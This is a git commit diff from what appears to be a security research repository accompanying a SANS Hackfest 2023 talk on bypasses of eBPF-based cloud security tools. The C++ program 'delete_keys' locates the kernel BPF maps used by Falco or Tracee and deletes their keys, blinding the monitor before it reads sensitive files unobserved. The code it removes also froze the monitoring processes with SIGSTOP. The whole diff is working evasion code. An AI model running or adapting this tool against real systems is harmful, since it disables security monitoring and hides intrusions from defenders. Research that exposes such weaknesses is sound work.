19b6b946c12420b35bfa7741ad10e3b7c3d7e6c5
Austin Gadient <austin.gadient@valicyber.com>
2023-11-16 15:41:49 -0700

    Cleanup delete_keys

--- agents/README.md
+++ agents/README.md
@@ -1,2 +1,7 @@
-falcosecurity/falco-no-driver:0.36.2
-aquasec/tracee:0.19.0
+# Agent Run Scripts
+This directory contains runscripts for the specific container images tested against all bypasses and exploits.
+It is important to note that using the "latest" container image for falco or tracee could yield different results
+than those presented in "A Compendium of Exploits and Bypasses for eBPF-based Cloud Security" at SANS Hackfest 2023.
+
+The specific version of falco used is falcosecurity/falco-no-driver:0.36.2
+The specific version of tracee used is aquasec/tracee:0.19.0
--- delete_keys/delete_keys.cpp
+++ delete_keys/delete_keys.cpp
@@ -1,15 +1,22 @@
-#include <stdio.h>
-#include <stdlib.h>
+#include <bpf/libbpf.h>
 #include <linux/bpf.h>
+#include <linux/bpf_common.h>
 #include <linux/if_link.h>
 #include <sys/syscall.h>
 #include <unistd.h>
-#include <string.h>
 
+#include <fstream>
 #include <iostream>
-#include <string>
 
 #define BPF_OBJ_NAME_LEN 16U
+
+constexpr char FALCO[] = "-falco";
+constexpr char FALCO_MAP[] = "syscall_exit_ta";
+constexpr char FALCO_FILE[] = "/etc/pam.conf";
+
+constexpr char TRACEE[] = "-tracee";
+constexpr char TRACEE_MAP[] = "events_map";
+constexpr char TRACEE_FILE[] = "/proc/sys/kernel/randomize_va_space";
 
 const size_t attr_sz = sizeof(union bpf_attr);
 const __u32 info_len = sizeof(struct bpf_map_info);
@@ -18,6 +25,17 @@ struct bpf_get_fd_by_id_opts {
     size_t sz; /* size of this struct for forward/backward compatibility */
     __u32 open_flags; /* permissions requested for the operation on fd */
     size_t :0;
+};
+
+// The documentation seems to lie about the structure
+struct map_elem {    /* Used by BPF_MAP_*_ELEM and BPF_MAP_GET_NEXT_KEY commands */
+    __u32 key;
+    __aligned_u64 key2;
+    union {
+        __aligned_u64 value;
+        __aligned_u64 next_key;
+    };
+    __u64 flags;
 };
 
 int sys_bpf(int cmd, union bpf_attr *attr, unsigned int size) {
@@ -96,57 +114,6 @@ int bpf_map_get_next_id(__u32 start_id, __u32 *next_id) {
     return bpf_obj_get_next_id(start_id, next_id, BPF_MAP_GET_NEXT_ID);
 }
 
-#include <iostream>
-#include <fstream>
-#include <string>
-#include <sstream>
-#include <filesystem>
-
-#include <signal.h>
-#include <unistd.h>
-
-pid_t findProcessByName(const std::string& name) {
-    std::filesystem::directory_iterator procIterator("/proc");
-
-    for (const auto& entry : procIterator) {
-        if (entry.is_directory()) {
-            std::string pid = entry.path().filename();
-
-            std::string commFilePath = "/proc/" + pid + "/comm";
-            std::ifstream commFile(commFilePath);
-
-            if (commFile.is_open()) {
-                std::string processName;
-                std::getline(commFile, processName);
-                if (processName == name) {
-                    return std::stoi(pid);
-                }
-
-                commFile.close();
-            }
-        }
-    }
-    std::cerr << "Could not find procname " << name << std::endl;
-    exit(1);
-    return 0; // Process not found
-}
-
-pid_t pause_proc(const std::string &procname) {
-    pid_t pid = 0;
-    if (procname == "tracee" || procname == "falco") {
-        pid = findProcessByName(procname);
-        kill(pid, SIGSTOP);
-    }
-    return pid;
-}
-
-void unpause_proc(int pid) {
-    kill(pid, SIGCONT);
-}
-
-constexpr char FALCO[] = "falco";
-constexpr char TRACEE[] = "tracee";
-
 void print_file_contents(const std::string &filename) {
     std::ifstream file(filename);
 
@@ -161,60 +128,37 @@ void print_file_contents(const std::string &filename) {
     }
 }
 
-void attack_tracee() {
-    pid_t pid = pause_proc(TRACEE);
+void delete_keys(int fd, const char *map_name) {
+    std::cout << "Targeting map " << map_name << std::endl;
+    struct map_elem map_item = {};
+    while (bpf_map_get_next_key(fd, &map_item, &map_item) == 0) {
+        __u32 key = static_cast<__u32>(map_item.key);
+        if (bpf_map_delete_elem(fd, &key) == 0) {
+            std::cout << "\tDeleted key " << key << " from " << map_name << std::endl;
+        }
+        key++;
+    }
+}
+
+void attack_map(const char *map_name, const char *target_file) {
     __u32 id = 0;
     while (bpf_map_get_next_id(id, &id) == 0) {
         struct bpf_get_fd_by_id_opts opts = {};
         struct bpf_map_info info = {};
         int fd = bpf_map_get_fd_by_id_opts(id, &opts);
         bpf_obj_get_info_by_fd(fd, &info);
-        if (strcmp(info.name, "events_map") == 0) {
-            __u32 key = 0;
-            while (key < 8020) {
-                bpf_map_delete_elem(fd, &key);
-                key++;
-            }
+        if (strcmp(info.name, map_name) == 0) {
+            delete_keys(fd, map_name);
         }
         close(fd);
     }
-    print_file_contents("/proc/sys/kernel/randomize_va_space");
-    unpause_proc(pid);
+    print_file_contents(target_file);
 }
 
-static int buf_process_sample(void *ctx, void *data, size_t len) {
-    return 0;
-}
-
-// #include <bpf/bpf_helper_defs.h>
-#include <linux/bpf_common.h>
-#include <bpf/libbpf.h>
-void attack_falco() {
-    char buf[4096] = {};
-    pid_t pid = pause_proc(FALCO);
-    // print_file_contents("/etc/pam.conf");
-    __u32 id = 0;
-    while (bpf_map_get_next_id(id, &id) == 0) {
-        struct bpf_get_fd_by_id_opts opts = {};
-        struct bpf_map_info info = {};
-        int fd = bpf_map_get_fd_by_id_opts(id, &opts);
-        bpf_obj_get_info_by_fd(fd, &info);
-        std::string map_name = std::string(info.name);
-        if (map_name == "syscall_exit_ta") {
-            std::cout << "Targeting map " << map_name << std::endl;
-            __u32 key = 0;
-            while (key < 512) {
-                if (bpf_map_delete_elem(fd, &key) == 0) {
-                    std::cout << "\tDeleted key " << key << " from " << map_name << std::endl;
-                }
-                key++;
-            }
-
-        }
-        close(fd);
-    }
-
-    unpause_proc(pid);
+void print_usage() {
+    std::cout << "Usage ./delete_keys [-tracee|-falco] " << std::endl;
+    std::cout << "     -tracee: Target tracee" << std::endl;
+    std::cout << "     -falco: Target falco" << std::endl;
 }
 
 int main(int argc, char *argv[]) {
@@ -222,13 +166,16 @@ int main(int argc, char *argv[]) {
     if (argc == 2) {
         target = argv[1];
     } else {
+        print_usage();
         return 0;
     }
 
     if (strcmp(target, TRACEE) == 0) {
-        attack_tracee();
+        attack_map(TRACEE_MAP, TRACEE_FILE);
     } else if (strcmp(target, FALCO) == 0) {
-        attack_falco();
+        attack_map(FALCO_MAP, FALCO_FILE);
+    } else {
+        print_usage();
     }
 }
 
